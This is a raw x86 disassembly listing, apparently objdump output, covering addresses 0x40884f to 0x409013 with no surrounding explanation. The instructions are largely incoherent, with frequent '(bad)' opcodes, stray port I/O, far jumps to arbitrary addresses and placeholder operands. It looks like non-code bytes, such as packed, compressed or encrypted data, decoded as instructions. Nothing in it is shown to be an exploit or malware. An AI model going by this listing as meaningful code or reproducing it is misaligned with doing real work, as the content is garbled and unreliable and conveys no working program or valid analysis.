  40884f:	push   0xff75a16f
  408854:	(bad)  
  408855:	jg     0x408855
  408857:	add    BYTE PTR fs:[eax+0x7e0062fe],dl
  40885e:	dec    BYTE PTR [edi+0x0]
  408861:	pop    esi
  408862:	(bad)  
  408863:	push   0x68fe6200
  408868:	add    BYTE PTR [eax+0x730064fe],cl
  40886e:	(bad)  
  40886f:	add    BYTE PTR fs:[esp+eax*1],cl
  408873:	add    BYTE PTR [eax],al
  408875:	fiadd  DWORD PTR [ebx]
  408877:	add    BYTE PTR gs:[esp+eax*1],dl
  40887b:	add    BYTE PTR gs:[esp+eax*1],bl
  40887f:	add    BYTE PTR [eax],al
  408881:	repz fwait
  408883:	aas    
  408884:	add    BYTE PTR [ebp+0x7b],al
  408887:	inc    ecx
  408888:	add    BYTE PTR [ebx+0x72],bl
  40888b:	inc    ecx
  40888c:	add    BYTE PTR [eax+0x3d004178],dl
  408892:	test   DWORD PTR [edi+0x0],edx
  408898:	add    BYTE PTR [eax],al
  40889a:	ret    
  40889b:	call   FWORD PTR [esi]
  40889d:	push   ss
  40889e:	int    0x4d
  4088a0:	sbb    dl,BYTE PTR [edx]
  4088a2:	leave  
  4088a3:	add    eax,DWORD PTR [eax]
  4088a5:	add    BYTE PTR [ebp-0x3e],dh
  4088a8:	lea    ebx,[eax-0x767746f4]
  4088ae:	adc    DWORD PTR [esi+esi*2+0x74a103b1],edx
  4088b5:	mov    al,0x6
  4088b7:	mov    ebx,0xc904957c
  4088bc:	pop    edx
  4088bd:	xchg   ecx,eax
  4088be:	(bad)  
  4088bf:	pushf  
  4088c0:	outs   dx,BYTE PTR ds:[esi]
  4088c1:	sub    bh,0xa9
  4088c4:	mov    WORD PTR [edi+0xcfb1075],fs
  4088ca:	pop    esi
  4088cb:	and    al,0x4
  4088cd:	sbb    dh,BYTE PTR [esi+0x750c0a27]
  4088d3:	aaa    
  4088d4:	not    DWORD PTR [edi]
  4088d6:	jle    0x4088e9
  4088d8:	in     al,dx
  4088d9:	cmp    al,0xa2
  4088db:	sub    eax,0x1a8525d6
  4088e0:	out    dx,al
  4088e1:	sub    edx,DWORD PTR [esi+0x75000330]
  4088e7:	inc    ebx
  4088e8:	jmp    0x408915
  4088ea:	jge    0x408910
  4088ec:	clc    
  4088ed:	sbb    eax,0x17fc396a
  4088f2:	jno    0x408905
  4088f4:	add    eax,DWORD PTR [eax]
  4088f6:	jne    0x408926
  4088f8:	cli    
  4088f9:	sbb    ch,BYTE PTR [ecx+0x49]
  4088fc:	frstor [eax]
  4088fe:	add    BYTE PTR [eax],al
  408900:	add    BYTE PTR [eax],al
  408902:	add    BYTE PTR [ebp-0x7],bl
  408905:	in     eax,0x33
  408907:	push   ecx
  408908:	push   cs
  408909:	in     eax,0x36
  40890b:	dec    ebx
  40890c:	cld    
  40890d:	iret   
  40890e:	xor    eax,0x3224f
  408913:	jne    0x4088f3
  408915:	cmp    ebx,ebx
  408917:	mov    ebp,0x29f40f6
  40891c:	popf   
  40891d:	inc    ecx
  40891e:	int3   
  40891f:	test   al,0x28
  408921:	add    eax,DWORD PTR [eax]
  408923:	jne    0x408927
  408925:	retf   0x66f9
  408928:	(bad)  
  408929:	jmp    0xcd35001d
  40892e:	fld    TBYTE PTR [ebx+ecx*1-0x2f]
  408932:	idiv   DWORD PTR [eax+edi*8-0x2c]
  408936:	or     DWORD PTR [eax+0x750db5d7],eax
  40893c:	repz aad 0xb
  40893f:	jge    0x408949
  408941:	mov    ecx,0xb067be3
  408946:	ficom  DWORD PTR [ebp-0x2a]
  408949:	sbb    ah,bl
  40894b:	adc    BYTE PTR [esi],0x31
  40894e:	lahf   
  40894f:	or     edx,DWORD PTR [esi-0x540c56b0]
  408955:	and    eax,0x33a1d2c9
  40895a:	stos   DWORD PTR es:[edi],eax
  40895b:	call   0x5aeabd09
  408960:	push   ss
  408961:	mov    esi,0x980e460f
  408966:	sub    al,0x0
  408968:	add    BYTE PTR [eax],al
  40896a:	add    BYTE PTR [eax],al
  40896c:	inc    edi
  40896d:	add    edi,esi
  40896f:	cli    
  408970:	jae    0x40896b
  408972:	mul    esp
  408974:	pop    esp
  408975:	push   es
  408976:	jmp    0x7cde:0xfb0275f8
  40897d:	xchg   ebx,eax
  40897e:	or     DWORD PTR [esi-0x5dfa7093],ebp
  408984:	jno    0x408988
  408986:	adc    DWORD PTR [eax-0x642b7373],edx
  40898c:	or     cl,0xc6
  40898f:	popf   
  408990:	test   BYTE PTR [eax-0x72606127],ah
  408996:	call   0xbd42fe9e
  40899b:	mov    ch,0x3e
  40899d:	enter  0xafa0,0x4b
  4089a1:	xchg   esp,eax
  4089a2:	call   FWORD PTR [esi+esi*4+0x390bffb3]
  4089a9:	dec    eax
  4089aa:	fld    DWORD PTR [ebx+edi*1+0x38]
  4089ae:	int3   
  4089af:	inc    ebx
  4089b0:	xor    esp,DWORD PTR [edi]
  4089b2:	out    0x19,al
  4089b4:	lea    edx,[ecx]
  4089b6:	out    dx,al
  4089b7:	adc    DWORD PTR [eax+0x42],esp
  4089ba:	retf   0x7bfa
  4089bd:	push   ss
  4089be:	test   BYTE PTR [eax],0x55
  4089c1:	dec    esi
  4089c2:	fld    TBYTE PTR [edi]
  4089c4:	sub    al,0x31
  4089c6:	in     al,0xd
  4089c8:	dec    edx
  4089c9:	dec    ebx
  4089ca:	ret    
  4089cb:	(bad)  
  4089cc:	arpl   WORD PTR [edi-0x25],ax
  4089cf:	mov    ah,0x0
  4089d1:	add    BYTE PTR [eax],al
  4089d3:	add    BYTE PTR [eax],al
  4089d5:	sub    al,0x49
  4089d7:	retf   
  4089d8:	jmp    0x43408c53
  4089dd:	pop    es
  4089de:	xchg   esi,eax
  4089df:	pop    edi
  4089e0:	dec    ebp
  4089e1:	or     DWORD PTR [ecx-0x69e7ef87],ebp
  4089e7:	pusha  
  4089e8:	jmp    0x7c408c63
  4089ed:	mov    al,0x67
  4089ef:	mov    edi,0xf66ba15e
  4089f4:	pop    ebx
  4089f5:	int3   
  4089f6:	push   edx
  4089f7:	add    BYTE PTR [ecx-0x3c],ch
  4089fa:	jge    0x408989
  4089fc:	popa   
  4089fd:	dec    BYTE PTR [eax-0x7f]
  408a00:	pop    edx
  408a01:	std    
  408a02:	add    DWORD PTR [eax],eax
  408a04:	push   edx
  408a05:	mov    WORD PTR [edi-0x4f],ss
  408a08:	inc    ebp
  408a09:	mov    ebp,0x9b38f561
  408a0e:	push   ecx
  408a0f:	add    BYTE PTR [eax+0x63],dl
  408a12:	es cmc 
  408a14:	pop    ebp
  408a15:	fs push ss
  408a17:	mov    ah,0x59
  408a19:	push   edx
  408a1a:	adc    BYTE PTR [eax],al
  408a1c:	jo     0x408a19
  408a1e:	jne    0x4089a5
  408a20:	add    BYTE PTR [ebp-0x7e],bl
  408a23:	cwde   
  408a24:	sahf   
  408a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a26:	sbb    BYTE PTR [edi+0xcc83],0x0
  408a2d:	sbb    DWORD PTR [edx+0x4d],edx
  408a30:	or     al,0x1c
  408a32:	dec    ebp
  408a33:	inc    ecx
  408a34:	add    BYTE PTR [eax+0xe8faf0],dl
  408a3a:	add    BYTE PTR [eax],al
  408a3c:	add    BYTE PTR [eax],al
  408a3e:	jo     0x408a36
  408a40:	jmp    0x7df7:0xfbd657fd
  408a47:	in     al,dx
  408a48:	loope  0x408a49
  408a4a:	test   edi,esi
  408a4c:	rcr    bl,1
  408a4e:	outs   dx,BYTE PTR ds:[esi]
  408a4f:	cmc    
  408a50:	in     al,dx
  408a51:	out    0x8c,eax
  408a53:	push   es
  408a54:	fld    st(7)
  408a56:	stos   BYTE PTR es:[edi],al
  408a57:	in     eax,dx
  408a58:	repnz in eax,0xbd
  408a5b:	(bad)  
  408a5c:	retf   0xd5d9
  408a5f:	(bad)  
  408a60:	iret   
  408a61:	xlat   BYTE PTR ds:[ebx]
  408a62:	and    eax,0x11c1e6e9
  408a67:	(bad)  
  408a68:	(bad)  
  408a69:	(bad)  
  408a6a:	cmp    dh,bl
  408a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a6d:	mov    ds:0xe3c7aff5,al
  408a72:	xor    al,0xac
  408a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a75:	mov    dh,0xd6
  408a77:	mov    edi,0x9bb2efe9
  408a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a7e:	push   es
  408a7f:	out    dx,al
  408a80:	cmc    
  408a81:	mov    ebp,0xffd3b2c5
  408a86:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a88:	mov    ebx,0xc1c1f2a2
  408a8d:	popf   
  408a8e:	(bad)  
  408a8f:	mov    esp,edi
  408a91:	ret    
  408a92:	aam    0x8f
  408a94:	fwait
  408a95:	xchg   ecx,eax
  408a96:	mov    esi,0x7f84cdc5
  408a9b:	(bad)  
  408a9c:	sti    
  408a9d:	xlat   BYTE PTR ds:[ebx]
  408a9e:	jne    0x408a75
  408aa0:	mov    bl,BYTE PTR [eax+eax*1+0x0]
  408aa7:	adc    ch,BYTE PTR [ebx+eax*1+0x6a867500]
  408aae:	test   eax,0xa469bd20
  408ab3:	adc    eax,0x7500619a
  408ab8:	jb     0x408a68
  408aba:	push   esi
  408abb:	aas    
  408abc:	inc    eax
  408abd:	add    eax,DWORD PTR [eax]
  408abf:	jne    0x408aea
  408ac1:	add    eax,DWORD PTR [eax]
  408ac3:	jne    0x408ac5
  408ac5:	adc    edx,ebp
  408ac7:	mov    eax,ds:0xbbca74a4
  408acc:	fistp  QWORD PTR ds:0x211505d4
  408ad2:	loope  0x408a65
  408ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad5:	jp     0x408a5e
  408ad7:	in     al,dx
  408ad8:	(bad)  
  408ad9:	pop    edi
  408ada:	in     eax,0xb6
  408adc:	pop    ecx
  408add:	sub    eax,0x4268f59b
  408ae2:	ret    
  408ae3:	mov    al,0x3b
  408ae5:	or     eax,0x358e08ed
  408aea:	(bad)  
  408aeb:	push   0x53
  408aed:	and    ebp,esp
  408aef:	and    BYTE PTR [edi+0x1b],dh
  408af2:	neg    BYTE PTR [esi+0x3c]
  408af5:	and    ah,bh
  408af7:	bound  ecx,QWORD PTR [esi+0x6d3a8781]
  408afd:	daa    
  408afe:	out    dx,eax
  408aff:	pop    eax
  408b00:	jge    0x408b13
  408b02:	in     al,dx
  408b03:	dec    esi
  408b04:	xchg   esi,eax
  408b05:	inc    edx
  408b06:	fst    DWORD PTR [eax-0x4b]
  408b09:	adc    edi,esi
  408b0b:	add    BYTE PTR [eax],al
  408b0d:	add    BYTE PTR [eax],al
  408b0f:	add    dl,ch
  408b11:	pushf  
  408b12:	jbe    0x408a99
  408b14:	or     BYTE PTR [edx-0x65222780],ah
  408b1a:	jle    0x408aaa
  408b1c:	icebp  
  408b1d:	fwait
  408b1e:	cs int 0x3c
  408b21:	add    bh,BYTE PTR [edi+0x26]
  408b24:	push   cs
  408b25:	pop    edx
  408b26:	xor    esp,DWORD PTR [esi-0x2c]
  408b29:	xor    edx,DWORD PTR [edx+0x16]
  408b2c:	and    DWORD PTR ds:0x1c23234,ebp
  408b32:	pmullw mm3,QWORD PTR [edi+0x47dffacf]
  408b39:	mov    edx,0xd1a1d993
  408b3e:	hlt    
  408b3f:	mov    ebx,0x8f7ee8c
  408b44:	mov    esp,ebp
  408b46:	add    bh,ch
  408b48:	je     0x408b3c
  408b4a:	loopne 0x408b23
  408b4c:	xchg   ecx,eax
  408b4d:	add    esp,ebx
  408b4f:	clc    
  408b50:	jb     0x408b46
  408b52:	call   0x5143005a
  408b57:	push   esi
  408b58:	loopne 0x408bae
  408b5a:	xor    eax,0x1a2bb069
  408b5f:	dec    edi
  408b60:	(bad)  
  408b61:	push   edx
  408b62:	mov    ds:0x8074c62e,eax
  408b67:	test   ebx,ebx
  408b69:	mov    BYTE PTR [edx-0x7e],ch
  408b6c:	xor    BYTE PTR [ecx+0x5d],dh
  408b6f:	jle    0x408b72
  408b71:	xchg   BYTE PTR [edx+0x4],bl
  408b74:	add    BYTE PTR [eax],al
  408b76:	add    BYTE PTR [eax],al
  408b78:	add    BYTE PTR [ebp+0x2],dh
  408b7b:	das    
  408b7c:	mov    ebx,0xc812adc7
  408b81:	(bad)  
  408b82:	shl    bl,cl
  408b84:	mov    cl,0xb1
  408b86:	stos   DWORD PTR es:[edi],eax
  408b87:	inc    esp
  408b88:	aam    0xa4
  408b8a:	mov    ds,WORD PTR [edi]
  408b8c:	lahf   
  408b8d:	popf   
  408b8e:	test   eax,0xacaa9711
  408b93:	adc    eax,0xa9597a9
  408b98:	nop
  408b99:	and    dl,BYTE PTR [edx]
  408b9b:	aam    0xa
  408b9d:	outs   dx,DWORD PTR ds:[esi]
  408b9e:	repnz push DWORD PTR [ebp-0x2cfcf9d9]
  408ba5:	add    al,BYTE PTR [esi]
  408ba7:	sbb    bl,bh
  408ba9:	paddd  mm0,QWORD PTR ds:0x460905ea
  408bb0:	jmp    0xcf408e2b
  408bb5:	adc    al,0xa3
  408bb7:	jp     0x408b56
  408bb9:	sbb    al,0xa1
  408bbb:	addr16 mov eax,0xb072a0e9
  408bc1:	mov    ah,0xa8
  408bc3:	ins    BYTE PTR es:[edi],dx
  408bc4:	shr    esi,0x9d
  408bc7:	dec    DWORD PTR [eax-0x169969fc]
  408bcd:	jbe    0x408bd1
  408bcf:	add    BYTE PTR [edi+0x2b],bh
  408bd2:	sbb    BYTE PTR [ecx-0x6383d0a4],0x73
  408bd9:	and    al,0x73
  408bdb:	xchg   BYTE PTR [eax+0x0],bl
  408bde:	add    BYTE PTR [eax],al
  408be0:	add    BYTE PTR [eax],al
  408be2:	imul   BYTE PTR [ebx-0x7f]
  408be5:	push   ebx
  408be6:	adc    eax,DWORD PTR [ebp+0x53095783]
  408bec:	mov    edx,0x995b149b
  408bf1:	push   0x65b56018
  408bf6:	call   0xdaa2396d
  408bfb:	ins    DWORD PTR es:[edi],dx
  408bfc:	pushf  
  408bfd:	ins    BYTE PTR es:[edi],dx
  408bfe:	loop   0x408c6d
  408c00:	xchg   DWORD PTR [edi-0x1fffd4b],ecx
  408c06:	pop    edx
  408c07:	into   
  408c08:	sub    BYTE PTR [ebx+edx*2],ch
  408c0b:	retf   
  408c0c:	aaa    
  408c0d:	retf   
  408c0e:	out    0xd5,al
  408c10:	xor    cl,al
  408c12:	sti    
  408c13:	lds    esi,FWORD PTR [ebp-0x3a]
  408c16:	pop    ds
  408c17:	rcr    BYTE PTR [edx+0x32],1
  408c1a:	fstp   st(1)
  408c1c:	cs add cl,ah
  408c1f:	push   ecx
  408c20:	push   eax
  408c21:	bound  ebp,QWORD PTR [ecx+edi*1]
  408c24:	and    BYTE PTR [edi],ah
  408c26:	sbb    DWORD PTR [ebp-0x1],ecx
  408c29:	call   FWORD PTR [eax*1-0x1e790000]
  408c30:	mov    ebp,0x96d553b8
  408c35:	cdq    
  408c36:	lea    edx,ss:[ebx-0x6668a615]
  408c3d:	int    0x4f
  408c3f:	test   al,0xa8
  408c41:	ror    BYTE PTR [ebp+0xf58791],1
  408c47:	add    BYTE PTR [eax],al
  408c49:	add    BYTE PTR [eax],al
  408c4b:	push   ebp
  408c4c:	mov    ?,ecx
  408c4e:	mov    ch,BYTE PTR [ebx]
  408c50:	jl     0x408c2e
  408c52:	mov    eax,?
  408c54:	mov    bh,cl
  408c56:	hlt    
  408c57:	and    esp,esi
  408c59:	out    dx,al
  408c5a:	push   DWORD PTR [esi-0x17]
  408c5d:	mov    edx,0xbce644b8
  408c62:	mov    esi,0xedf6e672
  408c67:	xor    ebp,esp
  408c69:	mov    DWORD PTR [esp+edi*2-0x7e105519],ecx
  408c70:	out    dx,al
  408c71:	sti    
  408c72:	cli    
  408c73:	mov    ebp,0xc381d5d7
  408c78:	leave  
  408c79:	(bad)  
  408c7a:	cdq    
  408c7b:	(bad)  [ebx+0x45c9eda]
  408c81:	add    BYTE PTR [eax],al
  408c83:	fild   QWORD PTR [eax+edi*4-0x4a090842]
  408c8a:	lods   eax,DWORD PTR ds:[esi]
  408c8b:	shr    DWORD PTR [edx+0x5795ffff],cl
  408c91:	push   esp
  408c92:	push   ecx
  408c93:	add    DWORD PTR [ebx+edx*2+0x0],0x50
  408c98:	or     eax,DWORD PTR [esi]
  408c9a:	adc    DWORD PTR [ebp+0xf],esi
  408c9d:	out    dx,eax
  408c9e:	add    DWORD PTR [ebp+0x550dfd09],ecx
  408ca4:	out    0xfc,eax
  408ca6:	and    al,0xb8
  408ca8:	clc    
  408ca9:	mov    ch,0x1c
  408cab:	dec    esi
  408cac:	fbstp  TBYTE PTR [ebp+0x58]
  408cb2:	add    BYTE PTR [eax],al
  408cb4:	ins    DWORD PTR es:[edi],dx
  408cb5:	fiadd  DWORD PTR [edi]
  408cb7:	sbb    eax,0x3196e
  408cbc:	jne    0x408cb9
  408cbe:	in     eax,0x21
  408cc0:	cdq    
  408cc1:	lock loop 0x408cf7
  408cc4:	jne    0x408c50
  408cc6:	popa   
  408cc7:	stos   BYTE PTR es:[edi],al
  408cc8:	sub    edx,DWORD PTR [eax+0x3b75f065]
  408cce:	stos   BYTE PTR es:[edi],al
  408ccf:	add    BYTE PTR [ebp+0x70],dh
  408cd2:	mov    al,ds:0x93425a6a
  408cd7:	imul   ebx,DWORD PTR [eax+0x5164a772],0x6067a480
  408ce1:	ins    BYTE PTR es:[edi],dx
  408ce2:	stos   BYTE PTR es:[edi],al
  408ce3:	das    
  408ce4:	sub    BYTE PTR [eax+0x4868708c],al
  408cea:	mov    eax,ds:0xab907535
  408cef:	push   ecx
  408cf0:	sub    esi,DWORD PTR [ecx-0x55]
  408cf3:	push   ds
  408cf4:	aas    
  408cf5:	jg     0x408cea
  408cf7:	push   ebp
  408cf8:	das    
  408cf9:	leave  
  408cfa:	mov    edx,0xfbdd3741
  408cff:	inc    edi
  408d00:	mov    eax,0xb54dc4d9
  408d05:	out    0x3,al
  408d07:	inc    edx
  408d08:	retf   
  408d09:	push   ds
  408d0a:	mov    ebx,0xcbcdad4d
  408d0f:	cmp    eax,0x30ce2
  408d14:	jne    0x408ccd
  408d16:	push   edx
  408d17:	mov    ebx,0x0
  408d1c:	add    BYTE PTR [edx],al
  408d1e:	add    bl,BYTE PTR [eax+0x54]
  408d21:	inc    ebx
  408d22:	arpl   WORD PTR [esi+0xc],dx
  408d25:	jmp    0x408d7c
  408d27:	push   esp
  408d28:	dec    esp
  408d29:	sub    edx,DWORD PTR [ebx+0x3e]
  408d2c:	gs (bad) 
  408d2e:	pop    esi
  408d2f:	lea    ebp,[ecx-0x34]
  408d32:	pop    eax
  408d33:	dec    edi
  408d34:	arpl   ax,sp
  408d36:	dec    edi
  408d37:	aaa    
  408d38:	pop    edi
  408d39:	iret   
  408d3a:	addr16 dec esi
  408d3c:	jb     0x408d5f
  408d3e:	add    ch,BYTE PTR [edi-0x3a62805d]
  408d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d45:	popa   
  408d46:	fcmovb st,st(1)
  408d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d49:	pop    edi
  408d4a:	mov    ds:0x9f959dd5,eax
  408d4f:	mov    edi,0xcf8f48d1
  408d54:	xchg   esi,eax
  408d55:	pop    ebp
  408d56:	sahf   
  408d57:	out    dx,eax
  408d58:	add    esi,DWORD PTR [ebp+0x2]
  408d5b:	mov    ebp,0xb1b533b0
  408d60:	rcr    DWORD PTR [ebp-0x57],0xc1
  408d64:	mov    DWORD PTR [edx-0x4b],0xb585bebd
  408d6b:	mov    ch,0xbe
  408d6d:	xor    BYTE PTR [ecx+0x829c2a5],ch
  408d73:	jmp    0x7443027b
  408d78:	mov    al,0x31
  408d7a:	repnz call 0xb6:0x44c11cab
  408d82:	add    BYTE PTR [eax],al
  408d84:	add    BYTE PTR [eax],al
  408d86:	pop    ebp
  408d87:	mov    ch,0x42
  408d89:	mov    ch,0xc4
  408d8b:	mov    esp,0x2750032
  408d90:	mov    cl,0x31
  408d92:	das    
  408d93:	das    
  408d94:	mov    edi,0x973a3242
  408d99:	inc    eax
  408d9a:	sub    bh,BYTE PTR [ecx]
  408d9c:	add    BYTE PTR [ecx-0x342fbb62],ch
  408da2:	mov    bh,0x28
  408da4:	sar    DWORD PTR [edi-0x13ffd349],cl
  408daa:	xor    ch,ch
  408dac:	or     dl,cl
  408dae:	sbb    esp,esi
  408db0:	sbb    eax,0x1f040fea
  408db5:	fcomp  QWORD PTR [edx]
  408db7:	icebp  
  408db8:	add    al,0xb6
  408dba:	je     0x408db9
  408dbc:	push   ds
  408dbd:	jmp    0x13409038
  408dc2:	rol    ch,cl
  408dc4:	pop    ebp
  408dc5:	fnsave ds:0x30af48c2
  408dcb:	enter  0xa347,0xbd
  408dcf:	mov    esp,0xac179d53
  408dd4:	pop    eax
  408dd5:	mov    dh,0x76
  408dd7:	add    al,BYTE PTR [eax]
  408dd9:	adc    al,0x8b
  408ddb:	inc    ebp
  408ddc:	shl    DWORD PTR [edx],1
  408dde:	mov    bh,BYTE PTR [ebx]
  408de0:	retf   0x8e1c
  408de3:	cmp    esp,ecx
  408de5:	xor    BYTE PTR [ebx+0x2f],ah
  408de8:	retf   0x25
  408deb:	add    BYTE PTR [eax],al
  408ded:	add    BYTE PTR [eax],al
  408def:	jns    0x408df3
  408df1:	add    BYTE PTR [esi+0x49],al
  408df4:	dec    edi
  408df5:	stos   DWORD PTR es:[edi],eax
  408df6:	push   0x74b15c43
  408dfb:	cmovl  esi,DWORD PTR [ebx-0x41aabebd]
  408e02:	jmp    0x3840907d
  408e07:	pop    ds
  408e08:	popa   
  408e09:	mov    ch,0x86
  408e0b:	and    dl,BYTE PTR [edx-0x51]
  408e0e:	jp     0x408de5
  408e10:	pusha  
  408e11:	mov    al,ds:0x2d082
  408e16:	loopne 0x408e8c
  408e18:	jmp    0x1cab8e29
  408e1d:	push   ds
  408e1e:	or     DWORD PTR [ebx+edi*8+0x28],ebx
  408e22:	add    eax,0x51c1d29
  408e27:	push   ebp
  408e28:	add    DWORD PTR [eax],eax
  408e2a:	add    BYTE PTR [edx+eiz*1],ah
  408e2d:	cmp    DWORD PTR [edx+ebx*1],ebp
  408e30:	ds cmp eax,0x71a3d28
  408e36:	xor    DWORD PTR [eax+0x25],ecx
  408e39:	(bad)  
  408e3a:	jmp    FWORD PTR [edi]
  408e3c:	and    eax,0x31212730
  408e41:	ds ds leave 
  408e44:	sub    bh,BYTE PTR [eax]
  408e46:	sbb    DWORD PTR cs:[eax],ebp
  408e49:	cmp    al,0x34
  408e4b:	xor    DWORD PTR gs:[eax],esp
  408e4e:	add    BYTE PTR [ebp+0x10],dh
  408e51:	or     bl,BYTE PTR ds:0x0
  408e57:	add    BYTE PTR [ebx-0x3cfbfbf4],cl
  408e5d:	or     al,0x2
  408e5f:	adc    al,0x73
  408e61:	clc    
  408e62:	push   es
  408e63:	pop    ss
  408e64:	fadd   QWORD PTR [eax]
  408e66:	add    BYTE PTR [eax],al
  408e68:	(bad)  
  408e69:	jmp    0x408e4d
  408e6b:	cmc    
  408e6c:	jae    0x408e53
  408e6e:	stc    
  408e6f:	out    0x63,al
  408e71:	stc    
  408e72:	stc    
  408e73:	jmp    0xea8c:0x9c
  408e7a:	loope  0x408e70
  408e7c:	push   edx
  408e7d:	in     eax,dx
  408e7e:	jmp    0x408e65
  408e80:	outs   dx,BYTE PTR ds:[esi]
  408e81:	out    dx,eax
  408e82:	call   0x9bc39387
  408e87:	lea    edi,[ebx]
  408e89:	pushf  
  408e8a:	sahf   
  408e8b:	mov    BYTE PTR [edx+edi*2],cl
  408e8e:	cdq    
  408e8f:	mov    cs,WORD PTR [eax+eax*1-0x4a070000]
  408e96:	popf   
  408e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e98:	jne    0x408e1d
  408e9a:	pop    esp
  408e9b:	mov    eax,ds:0xac518bfe
  408ea0:	push   cs
  408ea1:	or     BYTE PTR [edx-0x58],0x75
  408ea5:	push   edi
  408ea6:	ss stc 
  408ea8:	xor    al,0x63
  408eaa:	aas    
  408eab:	mov    BYTE PTR [ecx+0x6f],0x3d
  408eaf:	retf   0x5945
  408eb2:	inc    eax
  408eb3:	rcl    DWORD PTR [ecx+0x41],cl
  408eb6:	inc    edi
  408eb7:	shl    BYTE PTR [ecx],cl
  408eb9:	sbb    al,BYTE PTR [ebx]
  408ebb:	add    BYTE PTR [eax],al
  408ebd:	add    BYTE PTR [eax],al
  408ebf:	add    BYTE PTR [eax],al
  408ec1:	jne    0x408e64
  408ec3:	xchg   DWORD PTR [ebx+eiz*8-0xf679565],ebx
  408eca:	nop
  408ecb:	or     BYTE PTR [edx-0x448d610f],0xf5
  408ed2:	mov    ch,0x69
  408ed4:	call   0xcf75:0x480e0
  408edb:	inc    ebp
  408edc:	fsubrp st(1),st
  408ede:	(bad)  [edx+ebx*8]
  408ee1:	ret    0x3ee2
  408ee4:	enter  0xdcb3,0x34
  408ee8:	stc    
  408ee9:	mov    dh,0xea
  408eeb:	cmp    ebx,ebx
  408eed:	lods   al,BYTE PTR ds:[esi]
  408eee:	jmp    0x9cb58f1e
  408ef3:	push   edx
  408ef4:	stos   DWORD PTR es:[edi],eax
  408ef5:	hlt    
  408ef6:	mov    al,ds:0xa9dd844a
  408efb:	dec    esp
  408efc:	mov    eax,0x3add5
  408f01:	jne    0x408f6c
  408f03:	(bad)  
  408f04:	arpl   WORD PTR [ebx],bp
  408f06:	lea    edx,[esi-0x7274f6b6]
  408f0c:	dec    DWORD PTR [edx+0xe40ac6e]
  408f12:	arpl   WORD PTR [edi+0x35021b57],bp
  408f18:	mov    edx,0x435b2ce
  408f1d:	jne    0x408f21
  408f1f:	or     cl,dh
  408f21:	test   ebp,ecx
  408f23:	sti    
  408f24:	fiadd  DWORD PTR [eax]
  408f26:	add    BYTE PTR [eax],al
  408f28:	add    BYTE PTR [eax],al
  408f2a:	xchg   ecx,eax
  408f2b:	out    0xf8,al
  408f2d:	add    esi,DWORD PTR [ebp+0x2]
  408f30:	ret    
  408f31:	es cmp eax,0x5a28b025
  408f37:	adc    al,0xbb
  408f39:	sbb    al,BYTE PTR [edx+eax*1-0x43]
  408f3d:	cmp    eax,0x32b33e3d
  408f42:	cmp    al,0x8
  408f44:	mov    ch,0x45
  408f46:	xor    eax,0x342aab46
  408f4b:	add    bh,BYTE PTR [edi+0x21]
  408f4e:	pop    es
  408f4f:	adc    dh,BYTE PTR [esi+0x14]
  408f52:	push   es
  408f53:	add    ah,dl
  408f55:	jmp    FWORD PTR [edx-0x15]
  408f58:	int    0xd4
  408f5a:	scas   eax,DWORD PTR es:[edi]
  408f5b:	out    dx,al
  408f5c:	and    al,0xc8
  408f5e:	test   esi,ecx
  408f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f61:	mov    eax,0xb00df046
  408f66:	sub    al,0xb9
  408f68:	(bad)  
  408f6a:	aas    
  408f6b:	mov    ebx,0xff3107ac
  408f70:	fiadd  DWORD PTR [eax]
  408f72:	jne    0x408f76
  408f74:	and    ch,BYTE PTR [edx]
  408f76:	scas   eax,DWORD PTR es:[edi]
  408f77:	ss jmp 0x3b430480
  408f7d:	cmp    BYTE PTR [ebp-0x42c0cccd],dh
  408f83:	xor    eax,0x38c83a68
  408f88:	jmp    0x6d430490
  408f8d:	add    BYTE PTR [eax],0x0
  408f90:	add    BYTE PTR [eax],al
  408f92:	add    BYTE PTR [eax+0x757b0d15],cl
  408f98:	add    al,BYTE PTR [eax]
  408f9a:	push   esi
  408f9b:	or     al,0x75
  408f9d:	test   ecx,ebp
  408f9f:	jbe    0x408fa3
  408fa1:	add    dh,ah
  408fa3:	xchg   esi,eax
  408fa4:	pop    es
  408fa5:	lahf   
  408fa6:	jmp    0x95409221
  408fab:	aam    0x4b
  408fad:	mov    esp,0x276e9
  408fb2:	(bad)  
  408fb3:	scas   al,BYTE PTR es:[edi]
  408fb4:	or     BYTE PTR [ebx-0x51a5457d],0x7f
  408fbb:	ret    0xbf74
  408fbe:	jo     0x408f69
  408fc0:	push   edx
  408fc1:	mov    bh,0x66
  408fc3:	xchg   esp,eax
  408fc4:	pusha  
  408fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fc6:	jmp    0x3e409241
  408fcb:	jns    0x408fa6
  408fcd:	and    al,dh
  408fcf:	jae    0x408fd3
  408fd1:	add    bh,cl
  408fd3:	out    0xa7,eax
  408fd5:	dec    edi
  408fd6:	pop    es
  408fd7:	loop   0x408f68
  408fd9:	jb     0x408fe8
  408fdb:	icebp  
  408fdc:	xchg   esi,eax
  408fdd:	cmp    ecx,ebp
  408fdf:	jbe    0x408fe3
  408fe1:	add    BYTE PTR [esp+esi*2-0x1919da29],bh
  408fe8:	add    eax,0xf0d11f28
  408fed:	sbb    eax,0x276e9
  408ff2:	jne    0x408f90
  408ff4:	push   cs
  408ff5:	stc    
  408ff6:	xor    DWORD PTR [eax],eax
  408ff8:	add    BYTE PTR [eax],al
  408ffa:	add    BYTE PTR [eax],al
  408ffc:	fwait
  408ffd:	sub    ecx,ebx
  408fff:	sbb    bh,BYTE PTR [ecx+0x2]
  409002:	add    BYTE PTR [ecx],cl
  409004:	loopne 0x408fcc
  409006:	or     esi,ecx
  409008:	in     eax,0x9f
  40900a:	outs   dx,DWORD PTR ds:[esi]
  40900b:	mov    ds:0xc033870f,al
  409010:	ret    
  409011:	xchg   ecx,eax
  409012:	das    
  409013:	(bad)  
